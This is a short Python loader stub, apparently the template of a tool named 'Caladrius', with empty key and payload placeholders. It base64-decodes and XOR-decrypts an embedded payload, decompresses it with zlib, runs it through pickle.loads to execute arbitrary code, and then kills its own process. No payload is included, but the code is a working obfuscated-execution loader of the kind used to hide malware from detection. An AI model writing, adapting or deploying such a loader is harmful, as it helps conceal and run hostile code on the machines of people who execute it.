import os, sys, pickle
from base64 import b64decode
from zlib import decompress

__KEY__ =  b""
__PAYLOAD__ = b""

if __name__ == "__main__":
    try:
        _=1/0
    except Exception:
        print("[~] Caladrius initialized")

        print("\n[~] Decoding & decrypting payload")

        decrypted = ""
        for a, b in zip(b64decode(__PAYLOAD__).decode(), __KEY__):
            try:
                decrypted += chr(ord(a) ^ b)
            except Exception as exc:
                sys.exit(f"[!] Failed to encrypt '{a}': {exc}")
        
        print("[~] Decompressing decrypted contents")
        try:
            contents = decompress(b64decode(decrypted))
        except Exception as exc:
            sys.exit(f"[!] Failed to decompress: {exc}")

        print("\n[~] Executing contents")
        pickle.loads(contents)
        
        print("\n[~] Finished.")
        os.kill(os.getpid(), 9)